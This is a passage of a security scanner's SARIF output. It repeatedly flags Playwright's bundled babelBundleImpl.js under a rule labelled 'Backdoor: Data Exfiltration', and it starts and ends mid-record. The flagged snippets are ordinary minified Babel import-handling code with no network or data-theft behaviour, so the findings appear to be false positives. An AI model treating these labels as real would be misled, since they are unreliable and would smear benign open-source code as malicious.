            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 5748,
                  "endLine": 1639,
                  "endColumn": 5753,
                  "snippet": {
                    "text": "h(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportSpecifier()){let p=Ec(f.get(\"imported\"),n),m=f.get(\"local\").node.name;c.imports.set(m,p);let b=s.get(m);b&&(s.delete(m),b.names.forEach(d=>{c.reexports.set(d,p)}),c.referenced=!0)}})}else if(u.isEx",
                    "rendered": {
                      "text": "h(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportSpecifier()){let p=Ec(f.get(\"imported\"),n),m=f.get(\"local\").node.name;c.imports.set(m,p);let b=s.get(m);b&&(s.delete(m),b.names.forEach(d=>{c.reexports.set(d,p)}),c.referenced=!0)}})}else if(u.isEx",
                      "markdown": "`h(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportSpecifier()){let p=Ec(f.get(\"imported\"),n),m=f.get(\"local\").node.name;c.imports.set(m,p);let b=s.get(m);b&&(s.delete(m),b.names.forEach(d=>{c.reexports.set(d,p)}),c.referenced=!0)}})}else if(u.isEx`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 5691,
                  "endLine": 1639,
                  "endColumn": 5696,
                  "snippet": {
                    "text": "ode);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportSpecifier()){let p=Ec(f.get(\"imported\"),n),m=f.get(\"local\").node.name;c.imports.set(m,p);let b=s.get(m);b&&(s.delete(m),b.names.forEach(d=>{",
                    "rendered": {
                      "text": "ode);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportSpecifier()){let p=Ec(f.get(\"imported\"),n),m=f.get(\"local\").node.name;c.imports.set(m,p);let b=s.get(m);b&&(s.delete(m),b.names.forEach(d=>{",
                      "markdown": "`ode);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportSpecifier()){let p=Ec(f.get(\"imported\"),n),m=f.get(\"local\").node.name;c.imports.set(m,p);let b=s.get(m);b&&(s.delete(m),b.names.forEach(d=>{`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 5552,
                  "endLine": 1639,
                  "endColumn": 5557,
                  "snippet": {
                    "text": "p===\"lazy\"},referenced:!1},a.set(f,p),i.set(f,[c])),p},l=!1;e.get(\"body\").forEach(u=>{if(u.isImportDeclaration()){let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportS",
                    "rendered": {
                      "text": "p===\"lazy\"},referenced:!1},a.set(f,p),i.set(f,[c])),p},l=!1;e.get(\"body\").forEach(u=>{if(u.isImportDeclaration()){let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportS",
                      "markdown": "`p===\"lazy\"},referenced:!1},a.set(f,p),i.set(f,[c])),p},l=!1;e.get(\"body\").forEach(u=>{if(u.isImportDeclaration()){let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexportNamespace.add(b)}),c.referenced=!0)}else if(f.isImportS`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 5494,
                  "endLine": 1639,
                  "endColumn": 5499,
                  "snippet": {
                    "text": " Set,reexportAll:null,wrap:null,get lazy(){return this.wrap===\"lazy\"},referenced:!1},a.set(f,p),i.set(f,[c])),p},l=!1;e.get(\"body\").forEach(u=>{if(u.isImportDeclaration()){let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexp",
                    "rendered": {
                      "text": " Set,reexportAll:null,wrap:null,get lazy(){return this.wrap===\"lazy\"},referenced:!1},a.set(f,p),i.set(f,[c])),p},l=!1;e.get(\"body\").forEach(u=>{if(u.isImportDeclaration()){let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexp",
                      "markdown": "` Set,reexportAll:null,wrap:null,get lazy(){return this.wrap===\"lazy\"},referenced:!1},a.set(f,p),i.set(f,[c])),p},l=!1;e.get(\"body\").forEach(u=>{if(u.isImportDeclaration()){let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsNamespace.add(p);let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexp`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 5423,
                  "endLine": 1639,
                  "endColumn": 5428,
                  "snippet": {
                    "text": "ew Map,importsNamespace:new Set,reexports:new Map,reexportNamespace:new Set,reexportAll:null,wrap:null,get lazy(){return this.wrap===\"lazy\"},referenced:!1},a.set(f,p),i.set(f,[c])),p},l=!1;e.get(\"body\").forEach(u=>{if(u.isImportDeclaration()){let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsName",
                    "rendered": {
                      "text": "ew Map,importsNamespace:new Set,reexports:new Map,reexportNamespace:new Set,reexportAll:null,wrap:null,get lazy(){return this.wrap===\"lazy\"},referenced:!1},a.set(f,p),i.set(f,[c])),p},l=!1;e.get(\"body\").forEach(u=>{if(u.isImportDeclaration()){let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsName",
                      "markdown": "`ew Map,importsNamespace:new Set,reexports:new Map,reexportNamespace:new Set,reexportAll:null,wrap:null,get lazy(){return this.wrap===\"lazy\"},referenced:!1},a.set(f,p),i.set(f,[c])),p},l=!1;e.get(\"body\").forEach(u=>{if(u.isImportDeclaration()){let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"default\")}),c.referenced=!0)}else if(f.isImportNamespaceSpecifier()){let p=f.get(\"local\").node.name;c.importsName`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 5313,
                  "endLine": 1639,
                  "endColumn": 5318,
                  "snippet": {
                    "text": "ame:e.scope.generateUidIdentifier((0,KC.basename)(f,(0,KC.extname)(f))).name,interop:\"none\",loc:null,imports:new Map,importsNamespace:new Set,reexports:new Map,reexportNamespace:new Set,reexportAll:null,wrap:null,get lazy(){return this.wrap===\"lazy\"},referenced:!1},a.set(f,p),i.set(f,[c])),p},l=!1;e.get(\"body\").forEach(u=>{if(u.isImportDeclaration()){let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"def",
                    "rendered": {
                      "text": "ame:e.scope.generateUidIdentifier((0,KC.basename)(f,(0,KC.extname)(f))).name,interop:\"none\",loc:null,imports:new Map,importsNamespace:new Set,reexports:new Map,reexportNamespace:new Set,reexportAll:null,wrap:null,get lazy(){return this.wrap===\"lazy\"},referenced:!1},a.set(f,p),i.set(f,[c])),p},l=!1;e.get(\"body\").forEach(u=>{if(u.isImportDeclaration()){let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"def",
                      "markdown": "`ame:e.scope.generateUidIdentifier((0,KC.basename)(f,(0,KC.extname)(f))).name,interop:\"none\",loc:null,imports:new Map,importsNamespace:new Set,reexports:new Map,reexportNamespace:new Set,reexportAll:null,wrap:null,get lazy(){return this.wrap===\"lazy\"},referenced:!1},a.set(f,p),i.set(f,[c])),p},l=!1;e.get(\"body\").forEach(u=>{if(u.isImportDeclaration()){let c=o(u.node.source,u.node);c.loc||(c.loc=u.node.loc),u.get(\"specifiers\").forEach(f=>{if(f.isImportDefaultSpecifier()){let p=f.get(\"local\").node.name;c.imports.set(p,\"default\");let m=s.get(p);m&&(s.delete(p),m.names.forEach(b=>{c.reexports.set(b,\"def`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 4992,
                  "endLine": 1639,
                  "endColumn": 4997,
                  "snippet": {
                    "text": "xport namespace should be first transformed by `@babel/plugin-transform-export-namespace-from`.\"):e.buildCodeFrameError(\"Unexpected export specifier type\")}function ipe(e,{getWrapperPayload:t,initializeReexports:r},n){let s=ape(e,r,n),i=new Map,a=new Map,o=(u,c)=>{let f=u.value,p=a.get(f);return p?i.get(f).push(c):(p={name:e.scope.generateUidIdentifier((0,KC.basename)(f,(0,KC.extname)(f))).name,interop:\"none\",loc:null,imports:new Map,importsNamespace:new Set,reexports:new Map,reexportNamespace:new Set,reexportAll:null,wrap:null,get lazy(){return this.wrap===\"lazy\"},referenced:!1},a.set(f,p),i.set(f",
                    "rendered": {
                      "text": "xport namespace should be first transformed by `@babel/plugin-transform-export-namespace-from`.\"):e.buildCodeFrameError(\"Unexpected export specifier type\")}function ipe(e,{getWrapperPayload:t,initializeReexports:r},n){let s=ape(e,r,n),i=new Map,a=new Map,o=(u,c)=>{let f=u.value,p=a.get(f);return p?i.get(f).push(c):(p={name:e.scope.generateUidIdentifier((0,KC.basename)(f,(0,KC.extname)(f))).name,interop:\"none\",loc:null,imports:new Map,importsNamespace:new Set,reexports:new Map,reexportNamespace:new Set,reexportAll:null,wrap:null,get lazy(){return this.wrap===\"lazy\"},referenced:!1},a.set(f,p),i.set(f",
                      "markdown": "`xport namespace should be first transformed by `@babel/plugin-transform-export-namespace-from`.\"):e.buildCodeFrameError(\"Unexpected export specifier type\")}function ipe(e,{getWrapperPayload:t,initializeReexports:r},n){let s=ape(e,r,n),i=new Map,a=new Map,o=(u,c)=>{let f=u.value,p=a.get(f);return p?i.get(f).push(c):(p={name:e.scope.generateUidIdentifier((0,KC.basename)(f,(0,KC.extname)(f))).name,interop:\"none\",loc:null,imports:new Map,importsNamespace:new Set,reexports:new Map,reexportNamespace:new Set,reexportAll:null,wrap:null,get lazy(){return this.wrap===\"lazy\"},referenced:!1},a.set(f,p),i.set(f`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 4974,
                  "endLine": 1639,
                  "endColumn": 4979,
                  "snippet": {
                    "text": "dCodeFrameError(\"Export namespace should be first transformed by `@babel/plugin-transform-export-namespace-from`.\"):e.buildCodeFrameError(\"Unexpected export specifier type\")}function ipe(e,{getWrapperPayload:t,initializeReexports:r},n){let s=ape(e,r,n),i=new Map,a=new Map,o=(u,c)=>{let f=u.value,p=a.get(f);return p?i.get(f).push(c):(p={name:e.scope.generateUidIdentifier((0,KC.basename)(f,(0,KC.extname)(f))).name,interop:\"none\",loc:null,imports:new Map,importsNamespace:new Set,reexports:new Map,reexportNamespace:new Set,reexportAll:null,wrap:null,get lazy(){return this.wrap===\"lazy\"},referenced:!1},",
                    "rendered": {
                      "text": "dCodeFrameError(\"Export namespace should be first transformed by `@babel/plugin-transform-export-namespace-from`.\"):e.buildCodeFrameError(\"Unexpected export specifier type\")}function ipe(e,{getWrapperPayload:t,initializeReexports:r},n){let s=ape(e,r,n),i=new Map,a=new Map,o=(u,c)=>{let f=u.value,p=a.get(f);return p?i.get(f).push(c):(p={name:e.scope.generateUidIdentifier((0,KC.basename)(f,(0,KC.extname)(f))).name,interop:\"none\",loc:null,imports:new Map,importsNamespace:new Set,reexports:new Map,reexportNamespace:new Set,reexportAll:null,wrap:null,get lazy(){return this.wrap===\"lazy\"},referenced:!1},",
                      "markdown": "`dCodeFrameError(\"Export namespace should be first transformed by `@babel/plugin-transform-export-namespace-from`.\"):e.buildCodeFrameError(\"Unexpected export specifier type\")}function ipe(e,{getWrapperPayload:t,initializeReexports:r},n){let s=ape(e,r,n),i=new Map,a=new Map,o=(u,c)=>{let f=u.value,p=a.get(f);return p?i.get(f).push(c):(p={name:e.scope.generateUidIdentifier((0,KC.basename)(f,(0,KC.extname)(f))).name,interop:\"none\",loc:null,imports:new Map,importsNamespace:new Set,reexports:new Map,reexportNamespace:new Set,reexportAll:null,wrap:null,get lazy(){return this.wrap===\"lazy\"},referenced:!1},`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 2871,
                  "endLine": 1639,
                  "endColumn": 2876,
                  "snippet": {
                    "text": "t p of Object.keys(Rfe(n)))a.getBinding(p)===t.getBinding(p)&&(s.has(p)&&(o=!0,u.hasOwnBinding(p)&&u.rename(p)),i.has(p)&&!l&&(l=p));if(!o&&!l)return;e.ensureBlock();let c=e.get(\"body\"),f=t.generateUidIdentifierBasedOnNode(n);e.get(\"left\").replaceWith(Hfe(\"let\",[Yfe(Lo(f))])),t.registerDeclaration(e.get(\"left\")),o&&c.unshiftContainer(\"body\",Ro(bc(\"=\",n,f))),l&&c.unshiftContainer(\"body\",Ro(gc(l)))}}}});var q0=E(ia=>{\"use strict\";Object.defineProperty(ia,\"__esModule\",{value:!0});ia.default=spe;ia.hasExports=tpe;ia.isSideEffectImport=rpe;ia.validateImportInteropOption=GC;var KC=require(\"path\"),Zfe=Oi(",
                    "rendered": {
                      "text": "t p of Object.keys(Rfe(n)))a.getBinding(p)===t.getBinding(p)&&(s.has(p)&&(o=!0,u.hasOwnBinding(p)&&u.rename(p)),i.has(p)&&!l&&(l=p));if(!o&&!l)return;e.ensureBlock();let c=e.get(\"body\"),f=t.generateUidIdentifierBasedOnNode(n);e.get(\"left\").replaceWith(Hfe(\"let\",[Yfe(Lo(f))])),t.registerDeclaration(e.get(\"left\")),o&&c.unshiftContainer(\"body\",Ro(bc(\"=\",n,f))),l&&c.unshiftContainer(\"body\",Ro(gc(l)))}}}});var q0=E(ia=>{\"use strict\";Object.defineProperty(ia,\"__esModule\",{value:!0});ia.default=spe;ia.hasExports=tpe;ia.isSideEffectImport=rpe;ia.validateImportInteropOption=GC;var KC=require(\"path\"),Zfe=Oi(",
                      "markdown": "`t p of Object.keys(Rfe(n)))a.getBinding(p)===t.getBinding(p)&&(s.has(p)&&(o=!0,u.hasOwnBinding(p)&&u.rename(p)),i.has(p)&&!l&&(l=p));if(!o&&!l)return;e.ensureBlock();let c=e.get(\"body\"),f=t.generateUidIdentifierBasedOnNode(n);e.get(\"left\").replaceWith(Hfe(\"let\",[Yfe(Lo(f))])),t.registerDeclaration(e.get(\"left\")),o&&c.unshiftContainer(\"body\",Ro(bc(\"=\",n,f))),l&&c.unshiftContainer(\"body\",Ro(gc(l)))}}}});var q0=E(ia=>{\"use strict\";Object.defineProperty(ia,\"__esModule\",{value:!0});ia.default=spe;ia.hasExports=tpe;ia.isSideEffectImport=rpe;ia.validateImportInteropOption=GC;var KC=require(\"path\"),Zfe=Oi(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 2798,
                  "endLine": 1639,
                  "endColumn": 2803,
                  "snippet": {
                    "text": "orted:i,scope:a}=this;if(!Wfe(n)){let o=!1,l,u=e.get(\"body\").scope;for(let p of Object.keys(Rfe(n)))a.getBinding(p)===t.getBinding(p)&&(s.has(p)&&(o=!0,u.hasOwnBinding(p)&&u.rename(p)),i.has(p)&&!l&&(l=p));if(!o&&!l)return;e.ensureBlock();let c=e.get(\"body\"),f=t.generateUidIdentifierBasedOnNode(n);e.get(\"left\").replaceWith(Hfe(\"let\",[Yfe(Lo(f))])),t.registerDeclaration(e.get(\"left\")),o&&c.unshiftContainer(\"body\",Ro(bc(\"=\",n,f))),l&&c.unshiftContainer(\"body\",Ro(gc(l)))}}}});var q0=E(ia=>{\"use strict\";Object.defineProperty(ia,\"__esModule\",{value:!0});ia.default=spe;ia.hasExports=tpe;ia.isSideEffectIm",
                    "rendered": {
                      "text": "orted:i,scope:a}=this;if(!Wfe(n)){let o=!1,l,u=e.get(\"body\").scope;for(let p of Object.keys(Rfe(n)))a.getBinding(p)===t.getBinding(p)&&(s.has(p)&&(o=!0,u.hasOwnBinding(p)&&u.rename(p)),i.has(p)&&!l&&(l=p));if(!o&&!l)return;e.ensureBlock();let c=e.get(\"body\"),f=t.generateUidIdentifierBasedOnNode(n);e.get(\"left\").replaceWith(Hfe(\"let\",[Yfe(Lo(f))])),t.registerDeclaration(e.get(\"left\")),o&&c.unshiftContainer(\"body\",Ro(bc(\"=\",n,f))),l&&c.unshiftContainer(\"body\",Ro(gc(l)))}}}});var q0=E(ia=>{\"use strict\";Object.defineProperty(ia,\"__esModule\",{value:!0});ia.default=spe;ia.hasExports=tpe;ia.isSideEffectIm",
                      "markdown": "`orted:i,scope:a}=this;if(!Wfe(n)){let o=!1,l,u=e.get(\"body\").scope;for(let p of Object.keys(Rfe(n)))a.getBinding(p)===t.getBinding(p)&&(s.has(p)&&(o=!0,u.hasOwnBinding(p)&&u.rename(p)),i.has(p)&&!l&&(l=p));if(!o&&!l)return;e.ensureBlock();let c=e.get(\"body\"),f=t.generateUidIdentifierBasedOnNode(n);e.get(\"left\").replaceWith(Hfe(\"let\",[Yfe(Lo(f))])),t.registerDeclaration(e.get(\"left\")),o&&c.unshiftContainer(\"body\",Ro(bc(\"=\",n,f))),l&&c.unshiftContainer(\"body\",Ro(gc(l)))}}}});var q0=E(ia=>{\"use strict\";Object.defineProperty(ia,\"__esModule\",{value:!0});ia.default=spe;ia.hasExports=tpe;ia.isSideEffectIm`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1639,
                  "startColumn": 2744,
                  "endLine": 1639,
                  "endColumn": 2749,
                  "snippet": {
                    "text": "t\"(e){let{scope:t,node:r}=e,{left:n}=r,{exported:s,imported:i,scope:a}=this;if(!Wfe(n)){let o=!1,l,u=e.get(\"body\").scope;for(let p of Object.keys(Rfe(n)))a.getBinding(p)===t.getBinding(p)&&(s.has(p)&&(o=!0,u.hasOwnBinding(p)&&u.rename(p)),i.has(p)&&!l&&(l=p));if(!o&&!l)return;e.ensureBlock();let c=e.get(\"body\"),f=t.generateUidIdentifierBasedOnNode(n);e.get(\"left\").replaceWith(Hfe(\"let\",[Yfe(Lo(f))])),t.registerDeclaration(e.get(\"left\")),o&&c.unshiftContainer(\"body\",Ro(bc(\"=\",n,f))),l&&c.unshiftContainer(\"body\",Ro(gc(l)))}}}});var q0=E(ia=>{\"use strict\";Object.defineProperty(ia,\"__esModule\",{value:!",
                    "rendered": {
                      "text": "t\"(e){let{scope:t,node:r}=e,{left:n}=r,{exported:s,imported:i,scope:a}=this;if(!Wfe(n)){let o=!1,l,u=e.get(\"body\").scope;for(let p of Object.keys(Rfe(n)))a.getBinding(p)===t.getBinding(p)&&(s.has(p)&&(o=!0,u.hasOwnBinding(p)&&u.rename(p)),i.has(p)&&!l&&(l=p));if(!o&&!l)return;e.ensureBlock();let c=e.get(\"body\"),f=t.generateUidIdentifierBasedOnNode(n);e.get(\"left\").replaceWith(Hfe(\"let\",[Yfe(Lo(f))])),t.registerDeclaration(e.get(\"left\")),o&&c.unshiftContainer(\"body\",Ro(bc(\"=\",n,f))),l&&c.unshiftContainer(\"body\",Ro(gc(l)))}}}});var q0=E(ia=>{\"use strict\";Object.defineProperty(ia,\"__esModule\",{value:!",
